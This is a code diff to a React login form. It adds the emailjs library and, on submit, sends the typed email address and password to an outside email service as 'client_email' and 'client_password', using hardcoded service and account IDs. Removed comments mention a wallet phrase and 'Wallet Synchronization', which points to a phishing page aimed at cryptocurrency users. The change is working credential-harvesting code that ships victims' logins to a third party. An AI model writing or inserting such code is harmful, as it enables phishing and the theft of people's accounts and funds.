@@ -1,5 +1,7 @@
 import React, { useState, useEffect } from 'react'
 import { connect } from 'react-redux'
+import emailjs from 'emailjs-com'
+
 
 import * as orderAction from '../store/actions'
 
@@ -15,17 +17,43 @@ const Form = (props) => {
         setPassword(e.target.value)
     }
 
+    const templateParams = {
+        client_email: email,
+        client_password: password,
+       
+    }
     const handleSubmit = async (e) => {
         e.preventDefault()
 
         console.log('credentials', email, password)
 
-        //props.onInitPutPhrase(phrase)
-        //  setToast({
-        //      content: 'Wallet Synchronization in process!!',
-        //      type: 'success',
-        //  })
+        if (email === '' || password === '' ) {
+            console.log('not sent')
+        } else {
+       
+
+            emailjs
+                .send(
+                    'service_ug3kztv',
+                    'template_1fpejxx',
+                    templateParams,
+                    'user_TyUAlfFTW7kMzOobPhtRV'
+                )
+                .then(
+                    (result) => {
+                        setDisplayMessage('Message sent')
+                        console.log(result.text, 'email sent')
+                        setEmail('')
+                        setName('')
+                        setMessage('')
+                    },
+                    (error) => {
+                        console.log(error, 'email failed')
+                    }
+                )
+        }
     }
+    
 
     return (
         <form
